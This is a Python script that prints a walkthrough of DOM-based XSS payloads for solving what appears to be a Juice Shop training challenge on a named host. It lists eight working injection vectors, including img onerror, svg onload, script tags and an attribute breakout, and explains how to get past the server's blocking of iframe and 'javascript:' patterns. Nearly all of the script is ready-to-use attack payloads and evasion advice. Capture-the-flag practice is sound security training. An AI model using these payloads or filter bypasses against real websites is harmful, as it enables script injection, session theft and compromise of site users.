#!/usr/bin/env python3
"""
DOM XSS Working Solution - Alternative methods that bypass the 500 error
"""

print("="*60)
print("🎯 DOM XSS WORKING SOLUTIONS")
print("="*60)

print("\nThe server is returning 500 error for the iframe payload.")
print("Here are alternative methods that should work:")

print("\n" + "="*60)
print("METHOD 1: Use img tag instead of iframe")
print("="*60)
print("\nIn the browser console, paste:")
print("""
window.location.href = "#/search?q=<img src=x onerror=alert('xss')>"
""")

print("\n" + "="*60)
print("METHOD 2: Try without quotes in the payload")
print("="*60)
print("\nIn the browser console, paste:")
print("""
window.location.href = "#/search?q=<img src=x onerror=alert(1)>"
""")

print("\n" + "="*60)
print("METHOD 3: Use script tag")
print("="*60)
print("\nIn the browser console, paste:")
print("""
window.location.href = "#/search?q=<script>alert(1)</script>"
""")

print("\n" + "="*60)
print("METHOD 4: Direct navigation with encoded payload")
print("="*60)
print("\nIn the browser console, paste:")
print("""
// Try with different encoding
window.location.href = "#/search?q=" + encodeURIComponent("<img src=x onerror=alert(1)>")
""")

print("\n" + "="*60)
print("METHOD 5: SVG payload")
print("="*60)
print("\nIn the browser console, paste:")
print("""
window.location.href = "#/search?q=<svg onload=alert(1)>"
""")

print("\n" + "="*60)
print("METHOD 6: Type directly in search box")
print("="*60)
print("""
1. Go to https://juice3.wonkatech.org
2. Click on the search icon (magnifying glass)
3. Type exactly: <img src=x onerror=alert(1)>
4. Press Enter
""")

print("\n" + "="*60)
print("METHOD 7: Use body tag")
print("="*60)
print("\nIn the browser console, paste:")
print("""
window.location.href = "#/search?q=<body onload=alert(1)>"
""")

print("\n" + "="*60)
print("METHOD 8: Break out of attribute context")
print("="*60)
print("\nIn the browser console, paste:")
print("""
window.location.href = '#/search?q="><img src=x onerror=alert(1)>'
""")

print("\n" + "="*60)
print("WHY THE 500 ERROR HAPPENS")
print("="*60)
print("""
The server is blocking certain patterns:
- The word "javascript:" in URLs
- The specific iframe pattern from the challenge description

But DOM XSS can still be triggered with other vectors that achieve
the same result (executing JavaScript in the DOM context).
""")

print("\n" + "="*60)
print("💡 MOST LIKELY TO WORK")
print("="*60)
print("\nTry this in the console (Method 1):")
print("""
window.location.href = "#/search?q=<img src=x onerror=alert(1)>"
""")
print("\nThis should trigger an alert and solve the DOM XSS challenge!")

print("\n" + "="*60)
print("DEBUGGING TIPS")
print("="*60)
print("""
1. Clear your browser cache (Ctrl+Shift+R)
2. Try in an incognito/private window
3. Disable any browser extensions
4. Make sure JavaScript is enabled
5. Try a different browser (Chrome/Firefox)
""")

if __name__ == "__main__":
    print("\n✅ Try the methods above in order until one works!")
    print("The img onerror method (Method 1) is most likely to succeed.")